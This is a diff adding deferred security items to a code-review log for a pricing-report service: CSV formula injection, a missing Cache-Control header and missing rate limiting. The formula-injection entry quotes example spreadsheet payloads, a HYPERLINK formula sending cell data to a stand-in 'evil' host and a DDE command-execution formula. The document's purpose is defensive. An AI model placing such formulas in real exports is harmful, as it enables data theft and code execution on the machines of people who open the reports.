@@ -109,3 +109,25 @@ Items deferred during code review. Each entry includes the review date and sourc
 **Gap**: A malicious `job_id` containing `\r\n` or NUL bytes is currently safe from log-line injection because Pino's default `req` serializer emits structured JSON — control chars are escaped. If a future change swaps Pino for a plain-text logger, or registers a custom `req` serializer that string-concatenates the URL into a message, a crafted `job_id` could split or spoof log lines.
 **Why deferred**: No current code path is affected; today's Pino config is safe by construction.
 **Action**: Add a regression test that sends `GET /api/jobs/%00%0A%0Devil` (percent-encoded NUL/CR/LF) while capturing Pino log output, and asserts the emitted log line is a single well-formed JSON object with the control chars JSON-escaped.
+
+## Deferred from: code review of 4-3-get-api-reports-and-csv (2026-04-19)
+
+### CSV formula injection (CWE-1236) — competitor-controlled cells unescaped (Story 3.5 / 4.3)
+**Gap**: `escapeCell()` at [src/workers/scoring/buildReport.js:31-43] applies RFC 4180 quoting (commas, double-quotes, CR, LF) but does NOT prefix cells that start with `=`, `+`, `-`, `@`, `\t`, or `\r` with a leading single-quote or similar neutraliser. The CSV is built from Mirakl P11 competitor data — `product_title` is attacker-controllable by any seller listing on Worten/Carrefour. When the resulting `marketpilot-report.csv` is opened in Excel, LibreOffice Calc, or Google Sheets, such cells are interpreted as formulas (e.g. `=HYPERLINK("http://evil/steal?c="&A1,"click")` or DDE-style `=cmd|' /C calc'!A0`). Story 4.3's route layer streams `row.csv_data` verbatim (spec-mandated), so the route itself is innocent — the fix must live at build time in `buildReport.js`.
+**Why deferred**: Adding a leading `'` to at-risk cells would break the ATDD exact-byte test in `tests/epic4-4.3-get-api-reports-and-csv.atdd.test.js` ("CSV response body matches the stored csv_data exactly") and the 12-column header contract test ("CSV first line is the exact spec header") unless the neutraliser is applied only to data cells classified as "text" (not "numeric"). Current fixtures use numeric prices like `19.99` which must NOT be prefixed. Source-level comment at `buildReport.js:22-29` explicitly flags this trade-off.
+**Blast radius**: Formula execution on Pedro's / a seller's machine when opening the report CSV. Credential/file exfiltration via HYPERLINK/WEBSERVICE, or RCE via DDE in older Excel configs. Severity: MEDIUM — requires CSV to be opened in a spreadsheet app (not Notepad/cat/Preview).
+**Action**:
+1. In `buildReport.js`, classify cells: numeric cells (my_price, pt_first_price, gap, gap_pct, wow_score) pass through as-is; text cells (`ean`, `product_title`, `shop_sku`) run through a second pass that prefixes a leading `'` when the first char is in `[=+\-@\t\r]`.
+2. Update Story 3.5 ATDD / `additional.test.js` to cover each dangerous prefix for text cells and assert neutraliser is applied.
+3. Update Story 4.3 ATDD fixtures (`SAMPLE_CSV`) if the build-time output format changes, so the exact-byte assertion stays in sync.
+4. Consider also sanitising `email` at write-time — currently written to the DB untrimmed, though email never reaches the CSV.
+
+### No Cache-Control header on `/api/reports/:id` or `/api/reports/:id/csv` (Story 4.3)
+**Gap**: Neither route sets `Cache-Control`. Reports have 48h TTL; intermediate caches (corporate proxies, CDN misconfigs) could in theory cache a response under the unguessable URL. Report IDs are UUIDs → blast radius is one leaked URL per cache, but defense-in-depth would add `Cache-Control: private, no-store`.
+**Why deferred**: Low priority. Report URLs are unguessable; there is no CDN in front of the MVP (Traefik → Fastify direct); current deploy doesn't add shared caches. No AC requires it.
+**Action**: Add `Cache-Control: private, no-store` header on both successful JSON and CSV responses when infra changes (e.g. CDN fronting) make it relevant, or as blanket hardening once the 48h TTL is formally documented externally.
+
+### No rate limiting on `/api/reports/:id` and `/api/reports/:id/csv` (Story 4.3)
+**Gap**: A token-holder could repeatedly hit `/api/reports/:id/csv` to force large TEXT-column reads from SQLite. Fastify app has no `@fastify/rate-limit` plugin configured. For Worten-scale catalogs (~6 MB CSV), this is bounded; for future scale, it's a DoS vector.
+**Why deferred**: Report IDs are unguessable; legitimate users poll infrequently (HTML page fetches JSON once, downloads CSV once). Traefik can enforce rate limits externally in the MVP deploy. Not a correctness issue.
+**Action**: Covered by the broader rate-limiting action already deferred for Story 4.2 (install `@fastify/rate-limit` globally). When that work happens, apply the global default to `/api/reports/:id` and a lighter budget to `/csv` (legitimate use is one-shot download).
